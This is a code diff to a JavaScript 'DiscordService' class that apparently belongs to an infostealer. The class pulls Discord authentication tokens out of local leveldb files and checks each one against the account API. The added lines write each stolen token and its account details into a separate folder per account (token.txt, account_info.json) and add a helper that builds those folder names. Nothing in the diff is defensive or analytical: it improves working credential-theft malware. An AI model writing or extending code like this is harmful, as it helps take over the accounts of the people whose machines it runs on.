@@ -120,9 +120,6 @@ class DiscordService {
             }
 
             try {
-                // Save Discord data files
-                fileManager.save(clientPath, 'Discord', clientConfig.name);
-
                 // Extract tokens from leveldb files
                 const tokens = this.extractTokensFromPath(clientPath);
                 
@@ -130,6 +127,16 @@ class DiscordService {
                     try {
                         const accountData = await this.getAccountInfo(token);
                         if (accountData) {
+                            // Create individual folder for each Discord account
+                            const accountFolderName = this.getAccountFolderName(accountData);
+                            const folderPath = `Discord/${accountFolderName}`;
+                            
+                            // Save token to token.txt file in account's folder
+                            fileManager.saveText(token, folderPath, 'token.txt');
+                            
+                            // Save account info as well for reference
+                            fileManager.saveJson(accountData, folderPath, 'account_info.json');
+                            
                             accounts.push({
                                 ...accountData,
                                 client: clientConfig.name,
@@ -300,6 +307,26 @@ class DiscordService {
         }
 
         return badges;
+    }
+
+    /**
+     * Get a safe folder name for Discord account
+     * @param {Object} accountData - Account data
+     * @returns {string} Safe folder name
+     */
+    getAccountFolderName(accountData) {
+        // Use username#discriminator format, but make it safe for filesystem
+        let folderName = accountData.tag || `${accountData.username}#${accountData.discriminator}`;
+        
+        // Replace unsafe characters for filesystem
+        folderName = folderName.replace(/[<>:"/\\|?*]/g, '_');
+        
+        // Limit length to avoid filesystem issues
+        if (folderName.length > 50) {
+            folderName = folderName.substring(0, 47) + '...';
+        }
+        
+        return folderName;
     }
 
     /**
